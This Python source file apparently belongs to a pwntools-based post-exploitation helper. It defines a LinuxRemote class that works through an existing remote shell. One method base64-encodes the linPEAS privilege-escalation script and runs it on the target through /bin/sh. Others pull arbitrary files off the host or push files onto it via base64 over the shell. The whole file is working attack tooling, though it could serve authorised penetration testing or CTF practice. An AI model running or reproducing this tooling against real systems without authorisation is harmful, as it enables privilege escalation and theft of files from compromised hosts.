from pwn import *
from base64 import standard_b64decode, standard_b64encode
from pathlib import Path

from remote.remotestrategy import RemoteStrategy


class LinuxRemote(RemoteStrategy):
    def enum(self, username: str):
        i = Path("/opt/linPEAS/linpeas.sh")
        o = Path(f"{username}.{i.stem}.txt")
        if not o.exists():
            b64 = standard_b64encode(i.read_bytes()).decode("utf-8")
            cmd = f"echo $(echo {b64}|base64 -d|/bin/sh|base64 -w0)".encode("utf-8")
            self._conn.sendline(cmd)
            out = standard_b64decode(self._conn.recvline()[:-1])
            o.write_bytes(out)

    def get(self, arg: Path):
        cmd = f"echo $(cat {arg}|base64 -w0)".encode()
        self._conn.sendline(cmd)
        out = standard_b64decode(self._conn.recvline()[:-1])
        if b"No such file or directory" not in out:
            f = self.basedir / arg
            f.write_bytes(out)
        else:
            print(f"File {arg} does not exist")

    def put(self, arg: Path):
        if arg.exists():
            data = standard_b64encode(arg.read_bytes()).decode('utf-8')
            cmd = f"echo {data}|base64 -d>{arg.name}".encode()
            self._conn.sendline(cmd)
        else:
            print(f"File {arg} does not exist")
